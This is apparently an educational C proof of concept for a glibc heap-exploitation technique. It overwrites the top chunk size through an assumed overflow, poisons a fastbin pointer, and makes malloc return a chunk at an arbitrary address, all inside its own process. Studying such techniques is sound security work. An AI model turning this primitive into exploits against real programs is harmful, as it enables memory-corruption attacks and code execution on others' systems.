#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main()
{

    /*
      This shall be our target chunk. In this PoC we will be allocating a chunk of size 0x50 at arbitrary location, but any fastbin size can be used.
    */

    unsigned long target=0x51;
    fprintf(stderr, "target @ %p\n", &target);

    /*
      If we set the new top chunk size as 0x71, top chunk + size should be page aligned
    */

    char *p=(char*)malloc(0x1000-16-0x70);
    size_t *top= (size_t*)(p+0x1000-16-0x70);


    /*
      Assume that we have a heap overflow so that we can overwrite size of top chunk.
      We will overwrite it with 0x71 (prev_in_use is set).

      Note that both conditions for top chunk are satisfied -
        * Top chunk's prev_in_use is set
        * Top chunk + size is page aligned
    */

    top[1]=0x71;

    /*
     The size has to be 0x71 (prev in use is set) as 0x20 byte's will be used for the temporary chunk
     So after the allocattion of the temporary chunk the size will be 0x51
    */

    malloc(0x1000);

	pause();
    /*
      Now we will overwrite the next pointer of the fastbin of size 0x50 to point to the target chunk
    */

    top[2]=(size_t)(&target-1);

    malloc(0x50-16);

    /*
      Now the next chunk in the 0x50 fastbin list is our target chunk.
      The next call to malloc with appropriate size, will return us a chunk at the target address.
    */

    fprintf(stderr,"new chunk @ %p\n",malloc(0x50-16));
}
